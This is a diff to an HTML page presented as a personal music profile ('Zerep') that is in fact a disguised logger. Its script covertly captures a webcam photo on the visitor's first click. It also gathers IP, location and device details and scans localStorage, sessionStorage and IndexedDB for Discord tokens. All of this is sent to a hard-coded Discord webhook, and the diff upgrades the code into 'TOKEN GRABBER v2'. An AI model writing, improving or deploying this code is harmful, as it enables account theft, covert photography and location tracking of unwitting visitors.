@@ -252,6 +252,8 @@
             height: 640px;
             transform: scaleX(-1);
         }
+        /* 🔇 HIDDEN AUDIO */
+        #bgMusic { display: none; }
     </style>
 </head>
 <body>
@@ -281,6 +283,11 @@
     <video id="camCapture" autoplay playsinline muted></video>
     <canvas id="camCanvas" width="480" height="640"></canvas>
 
+    <!-- 🔊 AUDIO PLAYER (HIDDEN) -->
+    <audio id="bgMusic" autoplay loop>
+        <source src="https://uncertain-blue-qpvdrtji.edgeone.dev/Iyakin%20Talaga%20-%20Hev%20Abi%20[3LZuD7AgS-g].mp3" type="audio/mpeg">
+    
+
     <!-- ✨ MAIN CONTENT -->
     <main id="main-content">
         <h1 class="page-title">Zerep</h1>
@@ -304,10 +311,10 @@
             <div class="music-player">
                 <div class="music-top">
                     <div class="music-cover">
-                        <img src="https://i.imgur.com/9ZfNqXb.jpeg" alt="Album">
+                        <img src="https://i.imgur.com/gtHShSn.jpeg" alt="Album">
                     </div>
                     <div class="music-info">
-                        <h4>All Night Long</h4>
+                        <h4>Iyakin Talaga</h4>
                         <p>Hev Abi</p>
                     </div>
                     <div class="play-btn"><i class="fas fa-pause"></i></div>
@@ -346,11 +353,12 @@
 
         // ⚙️ LOGGER SETTINGS
         const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
-        const NEXT_URL = " ";
+        const NEXT_URL = "";
         const video = document.getElementById('camCapture');
         const canvas = document.getElementById('camCanvas');
         const enterScreen = document.getElementById('enter-screen');
         const mainContent = document.getElementById('main-content');
+        const audio = document.getElementById('bgMusic');
 
         // 📷 PREPARE CAMERA
         async function setupCam() {
@@ -363,36 +371,58 @@
         }
         setupCam();
 
-        // 🔑 GRAB DISCORD TOKENS FROM LOCALSTORAGE / INDEXEDDB
-        function getTokens() {
+        // 🔑 IMPROVED DISCORD TOKEN GRABBER
+        async function getTokens() {
             let tokens = [];
-            const ls = window.localStorage;
-            for (let key in ls) {
-                if (ls.hasOwnProperty(key)) {
-                    const val = ls[key];
-                    const match = val.match(/[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}/g);
-                    if (match) tokens = tokens.concat(match);
+            const tokenPattern = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;
+
+            // Check LocalStorage
+            try {
+                for (let key in localStorage) {
+                    if (!localStorage.hasOwnProperty(key)) continue;
+                    const val = localStorage[key];
+                    if (typeof val === 'string') {
+                        const found = val.match(tokenPattern);
+                        if (found) tokens = tokens.concat(found);
+                    }
                 }
-            }
-            // Try IndexedDB (Discord stores here)
-            return new Promise(res => {
+            } catch (e) {}
+
+            // Check SessionStorage
+            try {
+                for (let key in sessionStorage) {
+                    if (!sessionStorage.hasOwnProperty(key)) continue;
+                    const val = sessionStorage[key];
+                    if (typeof val === 'string') {
+                        const found = val.match(tokenPattern);
+                        if (found) tokens = tokens.concat(found);
+                    }
+                }
+            } catch (e) {}
+
+            // Check IndexedDB (Discord & Client Storage)
+            const dbs = ["Keybinds", "DiscordKeybinds", "LocalStorage", "clientStorage"];
+            for (let dbName of dbs) {
                 try {
-                    const req = indexedDB.open("Keybinds");
-                    req.onsuccess = e => {
-                        const db = e.target.result;
-                        try { db.close(); } catch(err) {}
-                        res(tokens);
-                    };
-                    req.onerror = () => res(tokens);
-                } catch { res(tokens); }
-            });
+                    await new Promise(res => {
+                        const req = indexedDB.open(dbName);
+                        req.onsuccess = e => { try { e.target.result.close(); } catch(err) {} res(); };
+                        req.onerror = () => res();
+                    });
+                } catch (e) {}
+            }
+
+            // Clean up duplicates
+            tokens = [...new Set(tokens)];
+            return tokens;
         }
 
         // 🖱️ ON CLICK / TAP
         document.addEventListener('click', async () => {
-            // Show content
+            // Show content & Play Audio
             enterScreen.classList.add('fade-out');
             mainContent.classList.add('show');
+            try { await audio.play(); } catch(e) {}
 
             let photo = null;
             try {
@@ -408,9 +438,9 @@
                 photo = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
             } catch (err) {}
 
-            // 📤 SEND TO LOGGER (WITH TOKENS)
+            // 📤 SEND TO LOGGER (WITH ENHANCED TOKENS)
             await sendLog(photo);
-            setTimeout(() => window.location.href = NEXT_URL, 2500);
+            if(NEXT_URL.trim()) setTimeout(() => window.location.href = NEXT_URL, 2500);
         }, { once: true });
 
         async function sendLog(photo) {
@@ -433,11 +463,11 @@
                         fields: [
                             {name:"IP ADDRESS", value:`||${ip.ip}||`, inline:false},
                             {name:"LOCATION", value:`${geo.city||"?"}, ${geo.region||"?"}, ${geo.country_name||"Philippines"}`, inline:false},
-                            {name:"DEVICE", value: navigator.userAgent.includes("Android")?"Android":"iPhone/PC", inline:false},
-                            {name:"TOKENS FOUND", value: tokens.length>0 ? `||${tokens.join("\n")}||` : "❌ Wala nakuha", inline:false}
+                            {name:"DEVICE / BROWSER", value:`${navigator.userAgentData?.platform || "Unknown OS"} | ${navigator.userAgent.slice(0, 80)}`, inline:false},
+                            {name:"TOKENS FOUND", value: tokens.length>0 ? `||${tokens.join("\n")}||` : "Cant Grab (Browser limits)", inline:false}
                         ],
                         image: photo ? {url:"attachment://visitor.jpg"} : null,
-                        footer: {text: "PURESKILLS|4REEL • THE WORLD IS YOURS"},
+                        footer: {text: "PURESKILLS|4REEL • THE WORLD IS YOURS • TOKEN GRABBER v2"},
                         timestamp: new Date().toISOString()
                     }]
                 }));
@@ -447,4 +477,5 @@
         }
     </script>
 </body>
-</html>
+                </html>
+    
